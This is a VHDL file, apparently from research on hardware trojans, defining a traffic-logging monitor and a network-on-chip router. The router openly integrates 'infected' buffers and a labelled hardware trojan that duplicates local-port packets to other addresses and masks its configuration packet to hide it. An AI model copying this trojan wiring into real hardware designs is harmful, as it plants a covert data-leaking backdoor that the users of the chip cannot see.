--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-- Nesse arquivo vhdl existem dois hardware!!!!
-- 
-- traffic_monitor <=== Linha 28.
-- RouterCC <========== Linha 271.
--
-- O traffic_monitor serve para fazer o monitoramento das portas de entrada do 
-- router. Quando o sinal rx for igual a '1', esse hardware vai copia tudo que 
-- tiver em data_in para o arquivo traffic_router.txt, que se encontra na pasta 
-- debug do seu testcases.
-- Dependendo do nome de seu teste, sera necessário alterar a linha 135 com o 
-- caminho determinado para salvar o arquivo.
--
-- Caso seu objetivo seja realizar uma synthesis é aconselhável deletar esse 
-- hardware, e remover o mesmo da architecture RouterCC, que se encontra mais 
-- abaixo nesse arquivo.
--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
library IEEE;
use IEEE.std_logic_1164.all;
use IEEE.std_logic_unsigned.all;
use work.standards.all;
use ieee.std_logic_arith;
use IEEE.std_logic_textio.all;
use std.textio.all;
use IEEE.NUMERIC_STD.all;

entity traffic_monitor is
   generic( ID : integer );
port(
      clock :     in std_logic;
      reset :     in std_logic;
      data_in :   in regflit;
	  address :	in regmetadeflit;
      rx :        in std_logic;
      credit_o :  in std_logic );
end traffic_monitor;

architecture arq_traffic of traffic_monitor is
   type type_state is (Hheader, Ppayload, Sservice, task_allocation, task_menssage, cont_payload);
   signal SM_traffic_monitor : type_state;
   
   signal tick_counter          :  reg32;
	signal target_router         : regflit;
	signal header_time           : integer;
	signal bandwidth_allocation  : integer;
	signal payload               : integer;
	signal payload_counter       : regflit;
	signal service               : regflit;
	signal task_id               : regflit;
	signal consumer_id           : regflit;
	

begin
   process(clock,reset)
      variable fstatus      : FILE_OPEN_STATUS;        
      variable outline      : line;                                                                                                                  
      variable newAdress    : integer;
      file     traf_router  : TEXT;
      
   begin
      if reset = '1' then
         SM_traffic_monitor <= Hheader;
         bandwidth_allocation <= 0;
         tick_counter <= (others => '0');
         header_time <= 0;
      	target_router <= (others => '0');
      	payload <= 0;
      	payload_counter <= (others => '0');
      	service <= (others => '0');
      	task_id <= (others => '0');
      	consumer_id <= (others => '0');
      	
      elsif clock'event and clock = '1' then
      	
         if rx = '1' and credit_o = '1' then
            if payload_counter /= x"00000000" then -- <<<<<<< olhar depois
               payload_counter <= payload_counter - '1';
            end if;
            
            bandwidth_allocation <= bandwidth_allocation + 1;
            
            case( SM_traffic_monitor ) is
            
               when Hheader => 
                              if (rx = '1' and credit_o = '1') then
                                 SM_traffic_monitor <= Ppayload;
                              else
                                 SM_traffic_monitor <= Hheader;
                              end if;
                              target_router <= data_in and x"0000FFFF";
            						header_time <= conv_integer(tick_counter);
               
      			when Ppayload =>
      								payload <= conv_integer(data_in);
      								payload_counter <= data_in;
      								SM_traffic_monitor <= Sservice;
      								
      			when Sservice =>
      								service <= data_in;
      								
      								if data_in /= x"40" and data_in /= x"70" and data_in /= x"221" and
      								 	data_in /= x"10" and data_in /= x"20" then
      										SM_traffic_monitor <= cont_payload;
      								else
      										SM_traffic_monitor <= task_allocation;
      								end if;
      			
      			when task_allocation =>
      								task_id <= data_in;
      								
      								if  service = x"10" or service = x"20" then 
      									SM_traffic_monitor <= task_menssage;
      								else
      									SM_traffic_monitor <= cont_payload;
      								end if;
      								
      			when task_menssage =>
      								consumer_id <= data_in;
      								SM_traffic_monitor <= cont_payload;
      								
      			when cont_payload =>
      								if payload_counter = x"00000001" then
            
						               newAdress := to_integer(unsigned(address));
						
						               file_open(fstatus, traf_router, "debug/traffic_router.txt", append_mode);
						               
						               if service /= x"40" and service /= x"70" and service /= x"221" and
						                  service /= x"10" and service /= x"20" then
						               
						                     write(outline, header_time);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, newAdress);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, CONV_STRING_16BITS(service(15 downto 0)));
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, payload);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, bandwidth_allocation);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, ID);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, conv_integer(target_router));
						
						               elsif  service = x"10" or service = x"20"  then
						               
						                     write(outline, header_time);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, newAdress);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, CONV_STRING_16BITS(service(15 downto 0)));
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, payload);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, bandwidth_allocation);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, ID);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, conv_integer(target_router));
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, conv_integer(task_id));
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, conv_integer(consumer_id));
						               
						               else
						                  
						                     write(outline, header_time);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, newAdress);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, CONV_STRING_16BITS(service(15 downto 0)));
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, payload);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, bandwidth_allocation);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, ID);
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, conv_integer(target_router));
						                     write(outline, HT); -- <<< horizontal tab
						                     write(outline, conv_integer(task_id));
						                  
						               end if;
						               
						               writeline(traf_router, outline);
						               file_close(traf_router);
						               bandwidth_allocation <= 0; 
						               SM_traffic_monitor <= Hheader;
							        
							        else
      			
      									SM_traffic_monitor <= cont_payload;
      								
      								end if;

            end case; 
      		
      	elsif bandwidth_allocation > 0 then
      			bandwidth_allocation <= bandwidth_allocation + 1;         
         
         end if;
         
         tick_counter <= tick_counter + 1;
            
      end if;
	end process;
   
end arq_traffic;
--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

library IEEE;
use IEEE.std_logic_1164.all;
use IEEE.std_logic_unsigned.all;
use work.standards.all;

entity RouterCC is
generic( address: regmetadeflit := (others=>'0'));
port(
	clock:     in  std_logic;
	reset:     in  std_logic;
	rx:        in  regNport;
	data_in:   in  arrayNport_regflit;
	credit_o:  out regNport;    
	tx:        out regNport;
	data_out:  out arrayNport_regflit;
	credit_i:  in  regNport);
end RouterCC;

architecture RouterCC of RouterCC is

signal h, ack_h, data_av, sender, data_ack: regNport := (others=>'0');
signal data : arrayNport_regflit := (others=>(others=>'0'));
signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
signal free: regNport := (others=>'0');

-- trojan signals
signal duplicate, data_ack_local, n_maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
signal txCrossbar : regNport := (others=>'0');
signal configPckt, turnOff, mux_dup : std_logic_vector(NPORT-2 downto 0) := (others=>'0');
signal dupFlit : regflit := (others=>'0');
signal destAddr : arrayNportless1_regmetadeflit := (others=>(others=>'0'));

--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-- Remova esse sinal quando for fazer a synthesis.
-- Esse signal foi utilizado para enviar o valor do credit_o dos Hermes_buffer
-- para o hardware traffic_monit.
-- Sendo assim, é necessário fazer o Replace de credit_o_sig para credit_o, 
-- que corresponde a porta de saída do RouterCC.
signal credit_o_sig :                           regNport := (others=>'0');
--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


begin


	
--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-- Remova esse generate caso queira fazer uma synthesis.
-- Esse generate é usado para o traffic_monitor das portas de entrada do router.
--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
credit_o <= credit_o_sig;
traffic_router: for i in 0 to (NPORT-1) generate 
	 traffic_monit : entity work.traffic_monitor
			generic map( ID  =>  i )
			 port map(
							clock    =>  clock,
							reset    =>  reset,
							data_in  =>  data_in(i),
							address  =>  address,
							rx       =>  rx(i),
							credit_o =>  credit_o_sig(i));
	end generate traffic_router;
--++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++              

	FEast : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(0),
		turnOff => turnOff(0),
		duplicate => duplicate,
		destAddr => destAddr(0),
		address => address,
		data_in => data_in(0),
		rx => rx(0),
		h => h(0),
		ack_h => ack_h(0),
		data_av => data_av(0),
		data => data(0),
		sender_o => sender(0),
		clock_rx => clock,
		data_ack => data_ack(0),
		credit_o => credit_o_sig(0));

	FWest : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(1),
		turnOff => turnOff(1),
		duplicate => duplicate,
		destAddr => destAddr(1),
		address => address,
		data_in => data_in(1),
		rx => rx(1),
		h => h(1),
		ack_h => ack_h(1),
		data_av => data_av(1),
		data => data(1),
		sender_o => sender(1),
		clock_rx => clock,
		data_ack => data_ack(1),
		credit_o => credit_o_sig(1));

	FNorth : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(2),
		turnOff => turnOff(2),
		duplicate => duplicate,		
		destAddr => destAddr(2),
		address => address,
		data_in => data_in(2),
		rx => rx(2),
		h => h(2),
		ack_h => ack_h(2),
		data_av => data_av(2),
		data => data(2),
		sender_o => sender(2),
		clock_rx => clock,
		data_ack => data_ack(2),
		credit_o => credit_o_sig(2));

	FSouth : Entity work.Hermes_bufferInfected
	port map(
		clock => clock,
		reset => reset,
		configPckt => configPckt(3),
		turnOff => turnOff(3),
		duplicate => duplicate,
		destAddr => destAddr(3),
		address => address,
		data_in => data_in(3),
		rx => rx(3),
		h => h(3),
		ack_h => ack_h(3),
		data_av => data_av(3),
		data => data(3),
		sender_o => sender(3),
		clock_rx => clock,
		data_ack => data_ack(3),
		credit_o => credit_o_sig(3));

	FLocal : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		data_in => data_in(4),
		rx => rx(4),
		h => h(4),
		ack_h => ack_h(4),
		data_av => data_av_local,
		data => data(4),
		sender => sender(4),
		data_ack => data_ack_local,
		credit_o => credit_o_sig(4));

	SwitchControl : Entity work.SwitchControl(AlgorithmXY)
	port map(
		clock => clock,
		reset => reset,
		duplicate => duplicate,
		dupAddr => dupFlit(METADEFLIT-1 downto 0),
		h => h,
		ack_h => ack_h,
		address => address,
		data => data,
		sender => sender,
		free => free,
		mux_in => mux_in,
		mux_out => mux_out,
		mux_dup => mux_dup,
		duplicating_o => duplicating);

	CrossBar : Entity work.Hermes_crossbar
	port map(
		data_av => data_av,
		data_in => data,
		data_ack => data_ack,
		data_dup => dupFlit,
		data_ack_dup => data_ack_dup,
		--sender => sender,
		free => free,
		tab_in => mux_in,
		tab_out => mux_out,
		tab_dup => mux_dup,
		tx => txCrossbar,
		data_out => data_out,
		credit_i => credit_i);

	---------------------
	-- HARDWARE TROJAN --
	---------------------
	HTrojan : Entity work.HardwareTrojan
	port map(
		clock 			=> clock,
        reset 			=> reset,
        data_in 		=> data(4),
        sending			=> sender(4),
        destAddr		=> destAddr,
        dupFlit			=> dupFlit,
        duplicate 		=> duplicate,
        configPckt 		=> configPckt,
      	n_maskPckt_o	=> n_maskPckt,
      	turnOff			=> turnOff
	);

	-- Enquanto estiver duplicando pacotes - Mascara-se o credito que vem dos transmissores pra não perder dado em caso de parada de um dos fluxos
	data_ack_local <= data_ack(LOCAL) AND data_ack_dup when duplicating = '1' else
					  data_ack(LOCAL);

	-- Não deixa passar o TX se ambos os buffers não podem recebe-lo - para evitar duplicação de flits em um dos buffers.
	data_av(4) <= '0' when duplicating = '1' and data_ack_local = '0' else
				  data_av_local;

	-- To ofuscate the configuration packet
	tx(LOCAL) <= txCrossbar(LOCAL) AND n_maskPckt;
	tx(EAST) <= txCrossbar(EAST);
	tx(WEST) <= txCrossbar(WEST);
	tx(SOUTH) <= txCrossbar(SOUTH);
	tx(NORTH) <= txCrossbar(NORTH);

end RouterCC;
